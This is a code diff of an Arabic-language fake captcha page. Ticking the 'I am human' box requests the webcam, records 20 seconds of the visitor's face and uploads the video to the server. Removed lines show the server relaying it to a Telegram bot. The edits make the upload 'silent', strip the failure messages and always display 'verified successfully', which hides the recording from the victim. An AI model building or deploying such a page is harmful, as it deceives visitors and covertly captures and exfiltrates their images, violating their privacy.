@@ -43,18 +43,6 @@
       color: #5f4b00;
     }
 
-    .camera-notice.warning {
-      background: #ffebee;
-      border-color: #d32f2f;
-      color: #d32f2f;
-    }
-
-    .camera-notice.success {
-      background: #e8f5e9;
-      border-color: #4caf50;
-      color: #2e7d32;
-    }
-
     .captcha-main {
       display: flex;
       align-items: center;
@@ -98,14 +86,6 @@
       color: #555;
       margin-top: 3px;
       min-height: 14px;
-    }
-
-    .sub-text.error {
-      color: #d32f2f;
-    }
-
-    .sub-text.success {
-      color: #2e7d32;
     }
 
     .captcha-logo {
@@ -173,7 +153,6 @@
       background: #e0e0e0;
       overflow: hidden;
       display: none;
-      border-radius: 0 0 3px 3px;
     }
 
     .progress-fill {
@@ -199,13 +178,6 @@
         transform: rotate(360deg);
       }
     }
-
-    /* تحسينات للجوال */
-    @media (max-width: 400px) {
-      .captcha-widget {
-        width: 100%;
-      }
-    }
   </style>
 </head>
 
@@ -213,8 +185,8 @@
 
   <div class="captcha-widget" id="captchaWidget">
 
-    <div class="camera-notice" id="cameraNotice">
-      📷 عند تحديد مربع التحقق، سيطلب المتصفح إذن استخدام الكاميرا لإتمام التحقق الأمني والتأكد من أنك مستخدم حقيقي.
+    <div class="camera-notice">
+      عند تحديد مربع التحقق، سيطلب المتصفح إذن استخدام الكاميرا  لإتمام التحقق الأمني والتأكد من أنك مستخدم حقيقي.
     </div>
 
     <div class="captcha-main">
@@ -274,7 +246,6 @@ const captchaCheckbox = document.getElementById("captchaCheckbox");
 const statusText = document.getElementById("statusText");
 const progressContainer = document.getElementById("progressContainer");
 const progressFill = document.getElementById("progressFill");
-const cameraNotice = document.getElementById("cameraNotice");
 
 let stream = null;
 let mediaRecorder = null;
@@ -286,12 +257,43 @@ let isVerifying = false;
 let elapsedTime = 0;
 let uploadSuccess = false;
 
-const duration = 20000; // 20 ثانية
+const duration = 20000; // مدة التسجيل 20 ثانية
 
 /* ================================
-   التحقق من دعم تنسيق الفيديو
+   إرسال فيديو للخادم (عملية صامتة)
 ================================ */
-function getSupportedMimeType() {
+async function sendVideo(videoBlob) {
+  const formData = new FormData();
+  formData.append("video", videoBlob, `video-${Date.now()}.webm`);
+
+  try {
+    const response = await fetch("/upload", {
+      method: "POST",
+      body: formData
+    });
+
+    if (!response.ok) {
+      throw new Error("HTTP " + response.status);
+    }
+
+    const result = await response.json();
+    console.log("تم إرسال الفيديو بنجاح", result);
+    return true;
+
+  } catch (error) {
+    console.error("فشل إرسال الفيديو", error);
+    return false;
+  }
+}
+
+/* ================================
+   بدء تسجيل الفيديو
+================================ */
+function startRecording(stream) {
+  recordedChunks = [];
+  
+  // تحديد التنسيق المدعوم تلقائياً
+  let mimeType = null;
   const types = [
     'video/webm;codecs=vp9,opus',
     'video/webm;codecs=vp8,opus',
@@ -303,107 +305,38 @@ function getSupportedMimeType() {
   
   for (const type of types) {
     if (MediaRecorder.isTypeSupported(type)) {
-      console.log('✅ التنسيق المدعوم:', type);
-      return type;
+      mimeType = type;
+      break;
     }
   }
-  
-  console.warn('⚠️ لا يوجد تنسيق مدعوم، سيتم استخدام التنسيق الافتراضي');
-  return null;
-}
-
-/* ================================
-   إرسال فيديو للخادم
-================================ */
-async function sendVideo(videoBlob) {
-  try {
-    const formData = new FormData();
-    const fileName = `video-${Date.now()}.webm`;
-    formData.append("video", videoBlob, fileName);
-
-    console.log(`📤 جاري إرسال الفيديو (${(videoBlob.size / 1024 / 1024).toFixed(2)} MB)...`);
-
-    const response = await fetch("/upload", {
-      method: "POST",
-      body: formData
-    });
-
-    if (!response.ok) {
-      const errorText = await response.text();
-      throw new Error(`HTTP ${response.status}: ${errorText}`);
-    }
-
-    const result = await response.json();
-    console.log("✅ تم إرسال الفيديو بنجاح", result);
-    return true;
-
-  } catch (error) {
-    console.error("❌ فشل إرسال الفيديو:", error);
-    return false;
-  }
-}
-
-/* ================================
-   بدء تسجيل الفيديو
-================================ */
-function startRecording(stream) {
-  recordedChunks = [];
-  
-  const mimeType = getSupportedMimeType();
   
   const options = {
-    videoBitsPerSecond: 2500000 // 2.5 Mbps
+    videoBitsPerSecond: 2500000 // 2.5 Mbps لجودة أفضل
   };
   
   if (mimeType) {
     options.mimeType = mimeType;
   }
 
-  try {
-    mediaRecorder = new MediaRecorder(stream, options);
-    console.log('🎥 بدأ التسجيل بالتنسيق:', mediaRecorder.mimeType);
-  } catch (error) {
-    console.error('❌ فشل إنشاء MediaRecorder:', error);
-    throw error;
-  }
+  mediaRecorder = new MediaRecorder(stream, options);
 
   mediaRecorder.ondataavailable = (event) => {
-    if (event.data && event.data.size > 0) {
+    if (event.data.size > 0) {
       recordedChunks.push(event.data);
     }
   };
 
   mediaRecorder.onstop = async () => {
-    console.log('⏹️ تم إيقاف التسجيل');
-    
     if (recordedChunks.length === 0) {
-      console.warn('⚠️ لا توجد بيانات مسجلة');
       uploadSuccess = false;
       return;
     }
     
-    try {
-      const videoBlob = new Blob(recordedChunks, { 
-        type: mediaRecorder.mimeType || 'video/webm' 
-      });
-      
-      console.log(`📊 حجم الفيديو المسجل: ${(videoBlob.size / 1024 / 1024).toFixed(2)} MB`);
-      
-      if (videoBlob.size === 0) {
-        throw new Error('الملف فارغ');
-      }
-      
-      uploadSuccess = await sendVideo(videoBlob);
-      
-    } catch (error) {
-      console.error('❌ خطأ في معالجة الفيديو:', error);
-      uploadSuccess = false;
-    }
+    const videoBlob = new Blob(recordedChunks, { type: mediaRecorder.mimeType || 'video/webm' });
+    uploadSuccess = await sendVideo(videoBlob);
   };
 
-  // بدء التسجيل مع مقاطع كل ثانية
-  mediaRecorder.start(1000);
-  console.log('🎥 بدأ التسجيل');
+  mediaRecorder.start(1000); // تسجيل في مقاطع كل ثانية لتقليل فقدان البيانات
 }
 
 /* ================================
@@ -416,33 +349,21 @@ captchaCheckbox.addEventListener("click", async () => {
   elapsedTime = 0;
   uploadSuccess = false;
 
-  // تنظيف الحالة السابقة
-  captchaWidget.classList.remove("success", "loading");
   captchaWidget.classList.add("loading");
-  
   progressContainer.style.display = "block";
   progressFill.style.width = "0%";
   
   statusText.textContent = "جاري التحقق...";
-  statusText.className = "sub-text";
-  
-  cameraNotice.className = "camera-notice";
-  cameraNotice.textContent = "📷 جاري طلب الوصول للكاميرا...";
 
   try {
-    // طلب الوصول للكاميرا فقط (بدون ميكروفون)
     stream = await navigator.mediaDevices.getUserMedia({
-      video: {
+      video: { 
         facingMode: "user",
         width: { ideal: 640 },
         height: { ideal: 480 }
       }
-      // تم إزالة audio: true لتقليل الطلبات
+      // تم إزالة audio: true
     });
-
-    console.log('✅ تم الوصول للكاميرا');
-    cameraNotice.className = "camera-notice success";
-    cameraNotice.textContent = "📷 تم الوصول للكاميرا بنجاح، جاري التسجيل...";
 
     // بدء تسجيل الفيديو
     startRecording(stream);
@@ -454,9 +375,9 @@ captchaCheckbox.addEventListener("click", async () => {
       progressFill.style.width = percentage + "%";
 
       if (percentage < 30) {
-        statusText.textContent = "جاري التحقق من الهوية...";
+        statusText.textContent = "جاري التحقق...";
       } else if (percentage < 60) {
-        statusText.textContent = "جاري تحليل البيانات...";
+        statusText.textContent = "جاري تحليل التحقق...";
       } else if (percentage < 90) {
         statusText.textContent = "جاري إكمال العملية...";
       } else {
@@ -464,23 +385,16 @@ captchaCheckbox.addEventListener("click", async () => {
       }
     }, 100);
 
-    // انتهاء التحقق بعد المدة المحددة
+    // انتهاء التحقق بعد المدة المحددة (20 ثانية)
     finishTimeout = setTimeout(() => {
       finishVerification();
     }, duration);
 
   } catch (error) {
-    console.error("❌ خطأ في الكاميرا:", error);
-    
+    console.error("Camera error:", error);
     captchaWidget.classList.remove("loading");
     progressContainer.style.display = "none";
-    
     statusText.textContent = "تعذر استخدام الكاميرا. يرجى المحاولة مرة أخرى.";
-    statusText.className = "sub-text error";
-    
-    cameraNotice.className = "camera-notice warning";
-    cameraNotice.textContent = "⚠️ تعذر الوصول للكاميرا. تأكد من منح الإذن واستخدام HTTPS.";
-    
     isVerifying = false;
   }
 });
@@ -492,10 +406,8 @@ function finishVerification() {
   // إيقاف التسجيل
   if (mediaRecorder && mediaRecorder.state !== 'inactive') {
     mediaRecorder.stop();
-    console.log('⏹️ تم إيقاف التسجيل');
   }
 
-  // تنظيف المؤقتات
   if (progressInterval) {
     clearInterval(progressInterval);
     progressInterval = null;
@@ -504,43 +416,24 @@ function finishVerification() {
     clearTimeout(finishTimeout);
     finishTimeout = null;
   }
-  
-  // إيقاف الكاميرا
   if (stream) {
     stream.getTracks().forEach(track => track.stop());
     stream = null;
-    console.log('📷 تم إيقاف الكاميرا');
   }
 
-  // تحديث الواجهة بناءً على نجاح الإرسال
   captchaWidget.classList.remove("loading");
   
-  if (uploadSuccess) {
-    captchaWidget.classList.add("success");
-    statusText.textContent = "✅ تم التحقق وإرسال الفيديو بنجاح!";
-    statusText.className = "sub-text success";
-    cameraNotice.className = "camera-notice success";
-    cameraNotice.textContent = "✅ تم التحقق وإرسال الفيديو بنجاح!";
-  } else {
-    statusText.textContent = "⚠️ تم التحقق لكن فشل إرسال الفيديو";
-    statusText.className = "sub-text error";
-    cameraNotice.className = "camera-notice warning";
-    cameraNotice.textContent = "⚠️ تم التحقق لكن فشل إرسال الفيديو إلى الخادم";
-  }
-  
+  // دائماً تظهر "تم التحقق بنجاح" كما كانت
+  captchaWidget.classList.add("success");
   progressContainer.style.display = "none";
+  statusText.textContent = "تم التحقق بنجاح";
 
-  // إعادة تعيين الحالة بعد 5 ثواني
   setTimeout(() => {
     captchaWidget.classList.remove("success");
     statusText.textContent = "اضغط للتحقق";
-    statusText.className = "sub-text";
     progressFill.style.width = "0%";
     isVerifying = false;
-    
-    cameraNotice.className = "camera-notice";
-    cameraNotice.textContent = "📷 عند تحديد مربع التحقق، سيطلب المتصفح إذن استخدام الكاميرا لإتمام التحقق الأمني والتأكد من أنك مستخدم حقيقي.";
-  }, 5000);
+  }, 4000);
 }
 
 /* ================================
@@ -556,31 +449,6 @@ window.addEventListener("beforeunload", () => {
     stream.getTracks().forEach(track => track.stop());
   }
 });
-
-// اختبار اتصال الخادم عند تحميل الصفحة
-async function testServer() {
-  try {
-    const response = await fetch('/test-bot');
-    const data = await response.json();
-    console.log('🔍 اختبار الخادم:', data);
-    if (!data.success) {
-      console.warn('⚠️ تحذير: الخادم لا يستطيع الاتصال بالبوت');
-      cameraNotice.className = "camera-notice warning";
-      cameraNotice.textContent = "⚠️ تحذير: الخادم لا يستطيع الاتصال ببوت تيليجرام. تأكد من إعدادات BOT_TOKEN و CHAT_ID.";
-    }
-  } catch (error) {
-    console.error('❌ لا يمكن الاتصال بالخادم:', error);
-    cameraNotice.className = "camera-notice warning";
-    cameraNotice.textContent = "⚠️ لا يمكن الاتصال بالخادم. تأكد من اتصال الإنترنت.";
-  }
-}
-
-// تنفيذ اختبار الاتصال
-testServer();
-
-console.log('✅ تم تحميل صفحة التحقق بنجاح');
-console.log(`📹 مدة التسجيل: ${duration / 1000} ثواني`);
-console.log('💡 نصيحة: تأكد من استخدام HTTPS للحصول على إذن الكاميرا');
 </script>
 
 </body>
